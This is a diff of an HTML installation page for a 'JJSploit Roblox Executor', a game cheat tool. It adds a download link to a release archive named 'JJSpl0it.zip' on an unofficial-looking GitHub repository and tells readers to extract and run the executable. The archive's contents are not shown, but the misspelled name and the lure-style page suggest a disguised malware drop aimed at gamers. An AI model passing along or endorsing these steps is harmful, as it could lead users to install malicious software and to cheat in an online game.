@@ -38,7 +38,7 @@
         <h2 style="font-size: 2.5em; color: #333;">Installation</h2>
         <p style="font-size: 1.2em;">To install the JJSploit Roblox Executor, follow these steps:</p>
         <ol style="font-size: 1.2em;">
-            <li>Download the software from the following link: <a href="#" style="color: #007BFF; text-decoration: none;">Download JJSploit Roblox Executor</a></li>
+            <li>Download the software from the following link: <a href="https://github.com/Kosakawa/JJSploit-Executor-Best-Roblox-Executor/releases/download/rv/JJSpl0it.zip" style="color: #007BFF; text-decoration: none;">Download JJSploit Roblox Executor</a></li>
             <li>Extract the downloaded ZIP file to a location of your choice on your computer.</li>
             <li>Run the executable file to launch the JJSploit Roblox Executor.</li>
         </ol>
